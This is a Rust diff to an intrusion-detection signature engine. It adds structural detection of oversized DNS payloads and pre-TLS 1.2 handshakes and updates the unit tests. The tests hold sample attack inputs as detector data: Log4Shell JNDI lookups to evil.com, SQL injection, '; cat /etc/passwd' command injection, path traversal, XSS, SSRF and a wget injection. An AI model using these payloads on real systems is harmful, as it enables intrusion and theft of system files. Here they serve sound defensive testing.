@@ -144,12 +144,6 @@ impl SignatureSet {
         })
     }
 
-    /// Scan a payload against all signatures without a protocol constraint
-    /// (every signature is eligible regardless of its `protocol` field).
-    pub fn scan(&self, payload: &[u8]) -> Vec<ScanMatch> {
-        self.scan_with_protocol(payload, "")
-    }
-
     /// Scan a payload, enforcing each signature's `protocol` field.
     ///
     /// A signature is only eligible when its `protocol` is empty/`any`/`*`
@@ -232,8 +226,12 @@ impl SignatureSet {
                     self.any_regex_match(sig_idx, payload)
                 }
                 (false, false) => {
-                    // No patterns at all — never fires on payload scan
-                    false
+                    // No content/regex patterns — only signatures with a
+                    // dedicated structural check (see
+                    // `structural_signature_fires`) can still fire. Before
+                    // this, such signatures were dead: they could never
+                    // match anything yet were counted as coverage.
+                    structural_signature_fires(sig, payload, &proto_filter)
                 }
             };
 
@@ -316,6 +314,48 @@ pub struct ScanMatch {
     pub category: String,
     /// Byte offset where first match occurred
     pub offset: usize,
+}
+
+/// Classic UDP DNS payload limit in bytes; larger datagrams (query or
+/// response) are an amplification / resource-abuse shape.
+const MAX_DNS_PAYLOAD_BYTES: usize = 512;
+
+/// Structural (non-pattern) checks for signatures that detect protocol
+/// anomalies no byte-pattern can express. These signatures previously had
+/// empty pattern lists and could never fire.
+///
+/// A protocol filter is REQUIRED: without knowing the payload's protocol
+/// these checks cannot be validated, so they stay silent under
+/// protocol-less scanning (which is why `scan()` was removed).
+fn structural_signature_fires(sig: &Signature, payload: &[u8], proto_filter: &str) -> bool {
+    match sig.sid {
+        // DNS: oversized query (possible amplification). The protocol
+        // analyzer labels port-53 traffic "dns", so the protocol filter is
+        // the port context.
+        2000020 => proto_filter == "dns" && payload.len() > MAX_DNS_PAYLOAD_BYTES,
+        // TLS: handshake advertising a protocol below TLS 1.2
+        // (SSLv2/SSLv3/early-TLS ClientHello).
+        2000030 => proto_filter == "tls" && tls_handshake_below_tls12(payload),
+        _ => false,
+    }
+}
+
+/// Whether the payload is a TLS handshake advertising a version below
+/// TLS 1.2 (0x0303): either an SSLv2-shaped record (two-byte header with
+/// the high bit of the first length byte set) or a modern record whose
+/// ClientHello `legacy_version` field is below 0x0303.
+fn tls_handshake_below_tls12(payload: &[u8]) -> bool {
+    // SSLv2 ClientHello: 0x80|length two-byte record header.
+    if payload.first().is_some_and(|b| b & 0x80 != 0) && payload.len() >= 3 {
+        return true;
+    }
+    // TLS record: type(1)=0x16 version(2) length(2), then handshake
+    // header: type(1)=0x01 length(3) legacy_version(2).
+    if payload.len() < 11 || payload[0] != 0x16 || payload[5] != 0x01 {
+        return false;
+    }
+    let legacy_version = u16::from_be_bytes([payload[9], payload[10]]);
+    legacy_version < 0x0303
 }
 
 /// Built-in signatures for common SMTP and mail-server attacks.
@@ -1083,9 +1123,79 @@ mod tests {
         let set = SignatureSet::new(sigs).expect("compile sigs");
         // VRFY is a recon technique; must match
         let payload = b"VRFY admin\r\n";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(!matches.is_empty());
         assert_eq!(matches[0].sid, 2000003);
+    }
+
+    #[test]
+    fn test_dns_oversized_payload_fires() {
+        // Fail-first: 2000020 had empty content/regex pattern lists, so it
+        // could never fire and was counted as coverage anyway.
+        let sigs = builtin_mail_signatures();
+        let set = SignatureSet::new(sigs).expect("compile sigs");
+        let small = vec![0u8; 100];
+        assert!(!set
+            .scan_with_protocol(&small, "dns")
+            .iter()
+            .any(|m| m.sid == 2000020));
+        // Above the classic 512-byte UDP DNS limit.
+        let big = vec![0u8; 600];
+        let matches = set.scan_with_protocol(&big, "dns");
+        assert!(
+            matches.iter().any(|m| m.sid == 2000020),
+            "oversized DNS payload must fire 2000020, got {:?}",
+            matches.iter().map(|m| m.sid).collect::<Vec<_>>()
+        );
+        // Protocol enforcement: an oversized non-DNS payload must not fire it.
+        assert!(!set
+            .scan_with_protocol(&big, "http")
+            .iter()
+            .any(|m| m.sid == 2000020));
+    }
+
+    /// Minimal TLS record wrapping a ClientHello with the given
+    /// legacy_version.
+    fn tls_client_hello(legacy_version: u16) -> Vec<u8> {
+        let mut p = vec![0x16, 0x03, 0x01, 0x00, 0x2f]; // record header
+        p.push(0x01); // ClientHello
+        p.extend_from_slice(&[0x00, 0x00, 0x26]); // handshake length
+        p.extend_from_slice(&legacy_version.to_be_bytes()); // legacy_version
+        p.extend_from_slice(&[0xAA; 32]); // random
+        p.extend_from_slice(&[0x00]); // session id len
+        p.extend_from_slice(&[0x00, 0x02, 0x00, 0x2f]); // cipher suites
+        p.extend_from_slice(&[0x01, 0x00]); // compression
+        p.extend_from_slice(&[0x00, 0x00]); // extensions len
+        p
+    }
+
+    #[test]
+    fn test_tls_legacy_version_below_tls12_fires() {
+        // Fail-first: 2000030 had empty pattern lists — never fired.
+        let sigs = builtin_mail_signatures();
+        let set = SignatureSet::new(sigs).expect("compile sigs");
+        // TLS 1.0 legacy_version (0x0301) — insecure.
+        let old = tls_client_hello(0x0301);
+        let matches = set.scan_with_protocol(&old, "tls");
+        assert!(
+            matches.iter().any(|m| m.sid == 2000030),
+            "pre-TLS1.2 ClientHello must fire 2000030, got {:?}",
+            matches.iter().map(|m| m.sid).collect::<Vec<_>>()
+        );
+        // Modern legacy_version (0x0303) — not fired.
+        let modern = tls_client_hello(0x0303);
+        assert!(!set
+            .scan_with_protocol(&modern, "tls")
+            .iter()
+            .any(|m| m.sid == 2000030));
+        // SSLv2-shaped hello (0x80 | length) — fired.
+        let sslv2 = [0x80, 0x40, 0x01, 0x00, 0x02, 0x00, 0x30];
+        assert!(
+            set.scan_with_protocol(&sslv2, "tls")
+                .iter()
+                .any(|m| m.sid == 2000030),
+            "SSLv2-style handshake must fire 2000030"
+        );
     }
 
     #[test]
@@ -1096,7 +1206,7 @@ mod tests {
         let payload: &[u8] = &[
             b'D', b'A', b'T', b'A', b'\r', b'\n', 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
         ];
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             !matches.is_empty(),
             "NOP sled must be detected in binary payload"
@@ -1113,7 +1223,7 @@ mod tests {
         let set = SignatureSet::new(sigs).expect("compile sigs");
         // The old broken pattern matched THIS text string — not real 0x90 bytes
         let payload = b"\\x90\\x90\\x90\\x90 (this is just the text literal)";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         // This text payload has NO actual 0x90 bytes — should NOT match NOP sled sig
         assert!(
             !matches.iter().any(|m| m.sid == 2000002),
@@ -1126,7 +1236,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"GET /?q=${jndi:ldap://evil.com/x} HTTP/1.1\r\n";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(!matches.is_empty(), "Log4Shell pattern must be detected");
         assert!(matches.iter().any(|m| m.sid == 2000012));
     }
@@ -1137,7 +1247,7 @@ mod tests {
         let set = SignatureSet::new(sigs).expect("compile sigs");
         // Normal legitimate EHLO must NOT fire (old SID 2000001 was removed)
         let payload = b"EHLO mail.example.com\r\n";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             !matches.iter().any(|m| m.sid == 2000001),
             "Normal EHLO greeting must NOT generate a false-positive alert"
@@ -1149,7 +1259,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"HELO normal.host.com\r\n";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         // Clean HELO should produce no matches
         assert!(
             matches.is_empty(),
@@ -1162,7 +1272,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"VRFY admin\r\nEXPN all-users\r\n";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(matches.len() >= 2);
     }
 
@@ -1173,7 +1283,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"GET /?q=${j${::-n}di:ldap://evil.com/x} HTTP/1.1\r\n";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000090),
             "Obfuscated Log4Shell should be caught by regex (SID 2000090): {:?}",
@@ -1186,7 +1296,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"GET /search?q=1' UNION ALL SELECT username,password FROM users -- HTTP/1.1";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000091),
             "UNION SELECT SQLi should match: {:?}",
@@ -1199,7 +1309,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"POST /api HTTP/1.1\r\n\r\nhost=; cat /etc/passwd";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000092),
             "Command injection should match: {:?}",
@@ -1212,7 +1322,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"<img src=x onerror=alert(1)>";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000095),
             "XSS event handler should match: {:?}",
@@ -1225,7 +1335,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"Content-Disposition: attachment; filename=\"invoice.pdf.exe\"";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000096),
             "Double extension should match: {:?}",
@@ -1238,7 +1348,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"GET /../../../../etc/passwd HTTP/1.1";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000094),
             "Path traversal should match: {:?}",
@@ -1251,7 +1361,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"GET /proxy?url=http://127.0.0.1:8080/admin HTTP/1.1";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000097),
             "SSRF to localhost should match: {:?}",
@@ -1265,7 +1375,7 @@ mod tests {
         let set = SignatureSet::new(sigs).expect("compile sigs");
         // Must have BOTH the content pattern AND regex to fire
         let payload = b"Content-Transfer-Encoding: base64\r\n\r\ncG93ZXJzaGVsbA==";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             matches.iter().any(|m| m.sid == 2000093),
             "Base64 PowerShell hybrid should match: {:?}",
@@ -1279,7 +1389,7 @@ mod tests {
         let set = SignatureSet::new(sigs).expect("compile sigs");
         // Regex matches but content pattern doesn't — should NOT fire
         let payload = b"some data cG93ZXJzaGVsbA here but no base64 header";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         assert!(
             !matches.iter().any(|m| m.sid == 2000093),
             "Hybrid sig should NOT fire without content pattern"
@@ -1291,7 +1401,7 @@ mod tests {
         let sigs = builtin_mail_signatures();
         let set = SignatureSet::new(sigs).expect("compile sigs");
         let payload = b"GET /api/users?page=1 HTTP/1.1\r\nHost: example.com\r\n";
-        let matches = set.scan(payload);
+        let matches = set.scan_with_protocol(payload, "");
         // Clean request should not trigger regex sigs
         let regex_sids: Vec<u32> = matches
             .iter()
@@ -1369,7 +1479,7 @@ mod tests {
             regex_patterns: vec![],
         };
         let set = SignatureSet::new(vec![sig]).expect("compile");
-        let matches = set.scan(b"GET /?cmd= HTTP/1.1\r\n");
+        let matches = set.scan_with_protocol(b"GET /?cmd= HTTP/1.1\r\n", "");
         assert!(
             matches.is_empty(),
             "single short token must not trigger a Drop: {:?}",
@@ -1389,7 +1499,7 @@ mod tests {
             regex_patterns: vec![],
         };
         let set2 = SignatureSet::new(vec![sig2]).expect("compile");
-        let matches2 = set2.scan(b"GET /?cmd=;wget x HTTP/1.1\r\n");
+        let matches2 = set2.scan_with_protocol(b"GET /?cmd=;wget x HTTP/1.1\r\n", "");
         assert!(matches2.iter().any(|m| m.sid == 8888002));
     }
 
@@ -1409,7 +1519,7 @@ mod tests {
             references: vec![],
         };
         let set = SignatureSet::new(vec![sig]).expect("compile regex sig");
-        let matches = set.scan(b"SSN: 123-45-6789");
+        let matches = set.scan_with_protocol(b"SSN: 123-45-6789", "");
         assert_eq!(matches.len(), 1);
         assert_eq!(matches[0].sid, 9999999);
     }
